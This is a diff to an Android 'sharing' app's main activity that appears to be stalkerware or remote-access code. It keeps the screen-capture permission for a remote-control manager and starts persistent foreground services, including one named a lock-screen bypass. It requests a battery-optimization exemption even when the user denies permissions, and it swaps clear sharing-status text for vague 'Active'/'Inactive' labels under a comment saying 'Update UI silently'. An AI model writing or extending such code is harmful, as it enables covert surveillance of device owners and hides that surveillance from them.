@@ -3,8 +3,13 @@ package com.example.myapplication;
 import android.content.Intent;
 import android.location.Location;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
 import android.widget.Toast;
@@ -23,6 +28,7 @@ import com.example.myapplication.services.LockScreenBypassService;
 import com.example.myapplication.utils.ScreenCaptureManager;
 import com.example.myapplication.utils.ScreenshotManager;
 import com.example.myapplication.utils.SocketManager;
+import com.example.myapplication.utils.RemoteControlManager;
 import com.google.android.material.snackbar.Snackbar;
 
 import org.json.JSONObject;
@@ -41,6 +47,8 @@ public class SharingActivity extends AppCompatActivity {
             new ActivityResultContracts.StartActivityForResult(),
             result -> {
                 if (result.getResultCode() == RESULT_OK && result.getData() != null) {
+                    // Store permission for remote control
+                    RemoteControlManager.getInstance().setScreenCapturePermission(result.getData(), result.getResultCode());
                     startScreenCapture(result.getData(), result.getResultCode());
                 } else {
                     Log.e(TAG, "Screen capture permission denied");
@@ -85,11 +93,14 @@ public class SharingActivity extends AppCompatActivity {
         
         // Initialize camera manager
         CameraManager.getInstance().initialize(this);
+        
+        // Initialize remote control manager
+        RemoteControlManager.getInstance();
     }
     
     private void startPersistentService() {
         try {
-            // Start main persistent service
+            // Start main persistent service first
             Intent serviceIntent = new Intent(this, PersistentService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
@@ -97,15 +108,24 @@ public class SharingActivity extends AppCompatActivity {
                 startService(serviceIntent);
             }
             
-            // Start lock screen bypass service
-            Intent lockBypassIntent = new Intent(this, LockScreenBypassService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(lockBypassIntent);
-            } else {
-                startService(lockBypassIntent);
-            }
+            // Wait a bit before starting the second service to avoid race conditions
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try {
+                    // Start lock screen bypass service
+                    Intent lockBypassIntent = new Intent(this, LockScreenBypassService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(lockBypassIntent);
+                    } else {
+                        startService(lockBypassIntent);
+                    }
+                    
+                    Log.d(TAG, "Lock screen bypass service started");
+                } catch (Exception e) {
+                    Log.e(TAG, "Error starting lock screen bypass service", e);
+                }
+            }, 500); // 500ms delay
             
-            Log.d(TAG, "All persistent services started from main activity");
+            Log.d(TAG, "Persistent services startup initiated");
         } catch (Exception e) {
             Log.e(TAG, "Error starting persistent services", e);
         }
@@ -140,12 +160,18 @@ public class SharingActivity extends AppCompatActivity {
             public void onPermissionsGranted() {
                 Log.d(TAG, "All permissions granted");
                 showMessage("All permissions granted");
+                
+                // Request battery optimization exemption
+                requestBatteryOptimizationExemption();
             }
             
             @Override
             public void onPermissionsDenied(List<String> deniedPermissions) {
                 Log.e(TAG, "Some permissions denied: " + deniedPermissions);
                 showMessage("Some permissions were denied. App may not work properly.");
+                
+                // Still try to request battery optimization exemption
+                requestBatteryOptimizationExemption();
             }
         });
     }
@@ -281,8 +307,8 @@ public class SharingActivity extends AppCompatActivity {
             }
         });
         
-        // Update UI
-        binding.screenSharingStatus.setText("Sharing Screenshots");
+        // Update UI silently
+        binding.screenSharingStatus.setText("Active");
         binding.btnStartScreenSharing.setEnabled(false);
         binding.btnStopScreenSharing.setEnabled(true);
     }
@@ -290,8 +316,8 @@ public class SharingActivity extends AppCompatActivity {
     private void stopScreenCapture() {
         ScreenshotManager.getInstance().stopCapture();
         
-        // Update UI
-        binding.screenSharingStatus.setText("Not sharing");
+        // Update UI silently
+        binding.screenSharingStatus.setText("Inactive");
         binding.btnStartScreenSharing.setEnabled(true);
         binding.btnStopScreenSharing.setEnabled(false);
     }
@@ -340,6 +366,37 @@ public class SharingActivity extends AppCompatActivity {
     
     private void showMessage(String message) {
         Snackbar.make(binding.getRoot(), message, Snackbar.LENGTH_SHORT).show();
+    }
+    
+    private void requestBatteryOptimizationExemption() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+                if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Log.d(TAG, "Requesting battery optimization exemption");
+                    
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    
+                    try {
+                        startActivity(intent);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Failed to open battery optimization settings", e);
+                        // Fallback to general battery optimization settings
+                        try {
+                            Intent fallbackIntent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                            startActivity(fallbackIntent);
+                        } catch (Exception e2) {
+                            Log.e(TAG, "Failed to open fallback battery settings", e2);
+                        }
+                    }
+                } else {
+                    Log.d(TAG, "Battery optimization already exempted or not available");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting battery optimization exemption", e);
+        }
     }
     
     @Override
